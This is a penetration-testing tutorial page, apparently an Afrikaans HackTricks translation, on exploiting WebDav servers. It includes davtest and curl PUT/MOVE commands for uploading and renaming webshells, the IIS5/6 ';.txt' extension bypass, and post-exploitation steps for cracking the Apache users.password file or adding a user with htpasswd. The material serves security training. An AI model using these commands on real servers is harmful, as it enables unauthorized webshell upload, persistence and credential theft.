# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **outomatiseer werksvloei** aangedryf deur die wÃªreld se **mees gevorderde** gemeenskaplike gereedskap.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS hakwerk van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **laai HackTricks af in PDF** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** ğŸ’¬ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Wanneer jy te make het met 'n **HTTP-bediener met WebDav** wat geaktiveer is, is dit moontlik om lÃªers te **manipuleer** as jy die regte **geloofsbriewe** het, gewoonlik geverifieer deur **HTTP Basiese Verifikasie**. Die verkryging van beheer oor so 'n bediener behels dikwels die **oplaai en uitvoer van 'n webshell**.

Toegang tot die WebDav-bediener vereis tipies **geldige geloofsbriewe**, met [**WebDav-bruteforce**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) wat 'n algemene metode is om dit te bekom.

Om beperkings op lÃªeroplaais te oorkom, veral diÃ© wat die uitvoer van bedienerkant-skripte voorkom, kan jy:

* **Laai** lÃªers met **uitvoerbare uitbreidings** direk op as dit nie beperk word nie.
* **Hernoem** opgelaai nie-uitvoerbare lÃªers (soos .txt) na 'n uitvoerbare uitbreiding.
* **Kopieer** opgelaai nie-uitvoerbare lÃªers, verander hul uitbreiding na een wat uitvoerbaar is.

## DavTest

**Davtest** probeer om **verskeie lÃªers met verskillende uitbreidings** op te laai en te **toets** of die uitbreiding **uitgevoer** word:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
## Voorbeeld van uitset:

![](<../../.gitbook/assets/image (19) (1).png>)

Dit beteken nie dat **.txt** en **.html-uitbreidings** uitgevoer word nie. Dit beteken dat jy hierdie lÃªers kan **bereik** via die web.

## Cadaver

Jy kan hierdie instrument gebruik om aan die WebDav-bedienaar te **koppel** en **handelinge** (soos **oplaai**, **skuif** of **verwyder**) **handmatig** uit te voer.
```
cadaver <IP>
```
## PUT versoek
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE versoek
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiseer werkafvloei** te bou wat aangedryf word deur die wÃªreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## IIS5/6 WebDav Swakheid

Hierdie kwesbaarheid is baie interessant. Die **WebDav** staan **nie toe** om lÃªers met die uitbreiding **.asp** te **oplaai** of **hernoem** nie. Maar jy kan dit **verbygaan** deur aan die einde van die naam **";.txt"** by te voeg en die lÃªer sal **uitgevoer** word asof dit 'n .asp-lÃªer was (jy kan ook **".html" in plaas van ".txt"** gebruik, maar **moet die ";" nie vergeet nie**).

Daarna kan jy jou dop as 'n ".**txt-lÃªer**" oplaai en dit na 'n ".asp;.txt" lÃªer **kopieer/verskuif**. Deur daardie lÃªer via die webbediener te **benader**, sal dit **uitgevoer** word (cadaver sal sÃª dat die skuifaksie nie gewerk het nie, maar dit het).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Posgelde

As die Webdav 'n Apache-bedienaar gebruik het, moet jy kyk na die ingestelde webwerwe in Apache. Gewoonlik:\
_**/etc/apache2/sites-enabled/000-default**_

Binne-in kan jy iets soos dit vind:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Soos u kan sien, is daar die lÃªers met die geldige **geldeenhede** vir die **webdav**-bediener:
```
/etc/apache2/users.password
```
Binne hierdie tipe lÃªers sal jy die **gebruikersnaam** en 'n **hash** van die wagwoord vind. Dit is die geloofsbriewe wat die webdav-bediener gebruik om gebruikers te verifieer.

Jy kan probeer om hulle te **kraak**, of om **meer by te voeg** as jy om enige rede die **webdav**-bediener wil **toegang** verkry:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Om te kontroleer of die nuwe geloofsbriewe werk, kan jy doen:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Verwysings

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** ğŸ’¬ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** aangedryf deur die wÃªreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
